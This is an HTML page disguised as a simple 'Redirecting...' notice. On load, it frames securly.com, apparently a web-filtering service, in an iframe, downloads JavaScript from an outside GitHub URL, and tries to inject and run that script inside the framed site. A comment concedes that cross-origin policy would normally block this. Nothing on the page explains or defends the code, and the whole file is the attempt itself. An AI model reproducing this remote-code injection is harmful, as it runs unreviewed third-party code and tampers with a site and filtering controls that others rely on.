<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting</title>
    <script>
        // Wait for the page to load
        window.addEventListener('load', () => {
            const redirectUrl = 'https://securly.com';
            const scriptUrl = 'https://raw.githubusercontent.com/Dy1ngRat/pupet/refs/heads/main/action.js';

            // Create an iframe
            const iframe = document.createElement('iframe');
            iframe.style.width = '100%';
            iframe.style.height = '500px';
            iframe.src = redirectUrl;

            document.body.appendChild(iframe);

            // Attempt to load script content into the iframe (requires same-origin policy compliance)
            iframe.addEventListener('load', () => {
                if (iframe.contentWindow && iframe.contentDocument) {
                    fetch(scriptUrl)
                        .then(response => response.text())
                        .then(scriptContent => {
                            const scriptElement = iframe.contentDocument.createElement('script');
                            scriptElement.textContent = scriptContent;
                            iframe.contentDocument.body.appendChild(scriptElement);
                        })
                        .catch(error => console.error('Error loading script:', error));
                } else {
                    console.warn('Cannot access iframe content. Cross-origin policy applies.');
                }
            });
        });
    </script>
</head>
<body>
    <h1>Redirecting...</h1>
</body>
</html>
